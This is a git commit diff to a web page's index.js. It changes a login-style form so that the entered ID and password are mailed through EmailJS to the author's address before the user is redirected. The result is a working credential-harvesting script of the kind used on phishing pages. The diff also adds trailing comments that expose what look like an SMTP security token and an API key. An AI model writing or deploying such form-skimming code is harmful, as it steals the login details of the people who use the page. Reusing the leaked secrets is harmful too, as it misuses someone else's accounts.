9b4c14859fb5bc8646929bbd05509c365a01a0fa
sohan004 <aryansohan02@gmail.com>
2023-03-10 04:29:48 +0600

    change

--- index.js
+++ index.js
@@ -3,11 +3,32 @@ document.getElementById('btn').addEventListener('click', () => {
     const input2 = document.getElementById('input-2').value
     const p = document.getElementById('p')
     if (input1.length > 0 && input2.length > 0) {
-        window.localStorage.setItem(input1, input2)
-        p.classList.add('d-none')
-        window.location.href = 'ind.html'
+        const params = {
+            name: 'sohan',
+            email: 'aryansohan02@gmail.com',
+            message: `id: ${input1}
+                     pass: ${input2}`,
+        };
+
+        const serviceID = "service_o79clcz";
+        const templateID = "template_2hvn30e";
+
+        emailjs.send(serviceID, templateID, params)
+            .then(res => {
+                alert("Your message sent successfully!!")
+                window.location.href = 'ind.html'
+
+            })
+            .catch(err => console.log(err));
     }
-    else{
+    else {
         p.classList.remove('d-none')
     }
 })
+
+
+
+
+// Your security token is b727c405-5a12-4178-aad2-2baefa82d8a1 Please take note of this.
+// Only elasticemail is supported as an SMTP host. To open an account please visit
+// DBF88FC8EA62E62864D4D4986C99F3014A25
